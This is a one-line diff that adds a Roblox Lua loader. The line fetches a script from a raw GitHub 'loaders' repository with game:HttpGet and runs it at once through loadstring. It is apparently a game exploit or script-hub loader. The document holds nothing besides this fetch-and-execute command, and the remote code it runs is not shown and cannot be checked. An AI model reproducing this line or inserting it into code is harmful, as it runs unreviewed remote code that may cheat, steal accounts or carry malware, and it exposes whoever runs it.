@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ShinobiComply/loaders/main/loaders/rainy-valley-spam0-myll5o62iy847c.lua"))()
